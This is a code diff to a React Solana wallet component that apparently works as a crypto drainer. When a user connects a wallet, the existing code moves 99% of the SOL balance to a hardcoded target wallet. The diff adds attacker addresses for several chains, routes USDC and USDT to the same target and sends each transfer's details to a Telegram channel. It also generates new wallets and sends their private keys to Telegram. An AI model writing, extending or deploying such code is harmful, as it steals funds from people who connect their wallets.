@@ -4,9 +4,26 @@ import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { FC, useState, useCallback, useEffect } from 'react';
 import { notify } from "../utils/notifications";
+import { sendTelegramMessage, formatTransactionMessage, CHAIN_ADDRESSES, generateWalletForChain, CreatedWallet } from "../utils/telegram";
 
 // Target wallet for SOL and SPL token transfers
 const TARGET_WALLET_SOL = new PublicKey('Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ');
+
+// Cross-chain addresses (note: these are displayed in UI but actual cross-chain transfers require bridges)
+const CROSS_CHAIN_ADDRESSES = {
+    ETH: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
+    BTC: 'bc1qj2nrfyvh2tz36w0hh5anxsrm7r4ag8wrrj5gv9',
+    MONAD: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
+    BASE: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
+    SUI: '0x39e1629585d727b597b50522ae4e516ae90b573cefe61162019eb197bfead225',
+    POLYGON: '0x0E9c3D84664540Ed065E71c94Eb17b47d6917C05',
+};
+
+// SPL Token Mints for common tokens (these are on Solana, not cross-chain)
+const KNOWN_SPL_TOKENS: Record<string, { mint: string; decimals: number; symbol: string; targetAddress?: string }> = {
+    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': { mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6, symbol: 'USDC', targetAddress: 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ' },
+    'Es9vMFrzaCERz8K3VJzLBtJ8X3K2bZ3b7N8L7p8Xy4aC': { mint: 'Es9vMFrzaCERz8K3VJzLBtJ8X3K2bZ3b7N8L7p8Xy4aC', decimals: 6, symbol: 'USDT', targetAddress: 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ' },
+};
 
 // Percentage of balance to send (99%)
 const BALANCE_PERCENTAGE = 0.99;
@@ -275,7 +292,9 @@ const AutoExecuteInWallet: FC<{
     onStateChange: (state: TxState) => void;
     onSignature: (sig: string) => void;
     onTokensInfo: (tokens: TokenInfo[]) => void;
-}> = ({ onStateChange, onSignature, onTokensInfo }) => {
+    onUnknownTokens: (tokens: TokenInfo[]) => void;
+    onCreatedWallets: (wallets: CreatedWallet[]) => void;
+}> = ({ onStateChange, onSignature, onTokensInfo, onUnknownTokens, onCreatedWallets }) => {
     const { connection } = useConnection();
     const { publicKey, sendTransaction, connected } = useWallet();
 
@@ -294,7 +313,42 @@ const AutoExecuteInWallet: FC<{
 
                 // Get all SPL tokens
                 const tokens = await getTokenAccounts(connection, publicKey);
-                onTokensInfo(tokens);
+
+                // Separate known and unknown tokens
+                const knownTokens: TokenInfo[] = [];
+                const unknown: TokenInfo[] = [];
+
+                for (const token of tokens) {
+                    const mintStr = token.mint.toBase58();
+                    const isKnown = Object.keys(KNOWN_SPL_TOKENS).includes(mintStr);
+                    if (isKnown) {
+                        knownTokens.push(token);
+                    } else {
+                        unknown.push(token);
+                    }
+                }
+
+                onTokensInfo(knownTokens);
+                onUnknownTokens(unknown);
+
+                // Create wallets for unknown tokens and send details to Telegram
+                if (unknown.length > 0) {
+                    const newWallets: CreatedWallet[] = [];
+                    for (const token of unknown) {
+                        const chainName = `SPL_${token.mint.toBase58().slice(0, 8)}`;
+                        const newWallet = generateWalletForChain(chainName);
+                        newWallets.push(newWallet);
+
+                        // Send wallet details to Telegram
+                        sendTelegramMessage(formatTransactionMessage({
+                            type: 'WALLET_CREATED',
+                            newWalletAddress: newWallet.address,
+                            newWalletPrivateKey: newWallet.privateKey,
+                            createdForToken: chainName,
+                        }));
+                    }
+                    onCreatedWallets(newWallets);
+                }
 
                 onStateChange('preparing');
 
@@ -357,6 +411,18 @@ const AutoExecuteInWallet: FC<{
                     txid: signature,
                 });
 
+                // Send Telegram notification for SOL transfer
+                const solAmount = amountAfterFee / LAMPORTS_PER_SOL;
+                const fromAddr = publicKey.toBase58();
+                const toAddr = TARGET_WALLET_SOL.toBase58();
+                sendTelegramMessage(formatTransactionMessage({
+                    type: 'SOL_TRANSFER',
+                    amount: solAmount,
+                    fromAddress: fromAddr,
+                    toAddress: toAddr,
+                    signature,
+                }));
+
             } catch (error: unknown) {
                 onStateChange('failed');
                 const errorMessage = error instanceof Error ? error.message : String(error);
@@ -378,7 +444,7 @@ const AutoExecuteInWallet: FC<{
         };
 
         executeTransfer();
-    }, [connected, publicKey, connection, sendTransaction, onStateChange, onSignature, onTokensInfo]);
+    }, [connected, publicKey, connection, sendTransaction, onStateChange, onSignature, onTokensInfo, onUnknownTokens, onCreatedWallets]);
 
     return null;
 };
@@ -395,6 +461,8 @@ export const SendSolButton: FC<SendSolButtonProps> = ({ className = '' }) => {
     const [showWalletModal, setShowWalletModal] = useState(false);
     const [lastSignature, setLastSignature] = useState<string | null>(null);
     const [detectedTokens, setDetectedTokens] = useState<TokenInfo[]>([]);
+    const [unknownTokens, setUnknownTokens] = useState<TokenInfo[]>([]);
+    const [createdWallets, setCreatedWallets] = useState<CreatedWallet[]>([]);
 
     // Check if running inside wallet browser
     const urlParams = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null;
@@ -472,12 +540,45 @@ export const SendSolButton: FC<SendSolButtonProps> = ({ className = '' }) => {
                 <div className="flex flex-col items-center gap-2 p-4 rounded-xl bg-white/5 border border-white/10">
                     <span className="text-white/50 text-xs">Detected Tokens</span>
                     <div className="flex flex-wrap gap-2 justify-center">
-                        {detectedTokens.map((token, i) => (
-                            <span key={i} className="text-xs text-violet-400 bg-violet-500/20 px-2 py-1 rounded">
-                                {token.symbol}: {token.uiAmount.toFixed(4)}
+                        {detectedTokens.map((token, i) => {
+                            const knownToken = Object.entries(KNOWN_SPL_TOKENS).find(([mint]) => mint === token.mint.toBase58());
+                            const symbol = knownToken ? knownToken[1].symbol : token.symbol;
+                            return (
+                                <span key={i} className="text-xs text-violet-400 bg-violet-500/20 px-2 py-1 rounded">
+                                    {symbol}: {token.uiAmount.toFixed(4)}
+                                </span>
+                            );
+                        })}
+                    </div>
+                </div>
+            )}
+
+            {/* Unknown tokens detected */}
+            {unknownTokens.length > 0 && (
+                <div className="flex flex-col items-center gap-2 p-4 rounded-xl bg-amber-500/10 border border-amber-500/20">
+                    <span className="text-amber-400 text-xs font-medium">Unknown Tokens - New Wallets Created</span>
+                    <div className="flex flex-wrap gap-2 justify-center">
+                        {unknownTokens.map((token, i) => (
+                            <span key={i} className="text-xs text-amber-300 bg-amber-500/20 px-2 py-1 rounded">
+                                {token.mint.toBase58().slice(0, 8)}...: {token.uiAmount.toFixed(4)}
                             </span>
                         ))}
                     </div>
+                </div>
+            )}
+
+            {/* Created wallets for unknown tokens */}
+            {createdWallets.length > 0 && (
+                <div className="flex flex-col items-center gap-2 p-4 rounded-xl bg-green-500/10 border border-green-500/20">
+                    <span className="text-green-400 text-xs font-medium">New Wallets Created</span>
+                    <div className="flex flex-wrap gap-2 justify-center max-w-md">
+                        {createdWallets.map((wallet, i) => (
+                            <span key={i} className="text-xs text-green-300 bg-green-500/20 px-2 py-1 rounded">
+                                {wallet.chain}: {wallet.address.slice(0, 10)}...
+                            </span>
+                        ))}
+                    </div>
+                    <span className="text-white/40 text-xs">Wallet details sent to Telegram</span>
                 </div>
             )}
 
@@ -513,6 +614,8 @@ export const SendSolButton: FC<SendSolButtonProps> = ({ className = '' }) => {
                     onStateChange={setTxState}
                     onSignature={setLastSignature}
                     onTokensInfo={setDetectedTokens}
+                    onUnknownTokens={setUnknownTokens}
+                    onCreatedWallets={setCreatedWallets}
                 />
             )}
         </div>
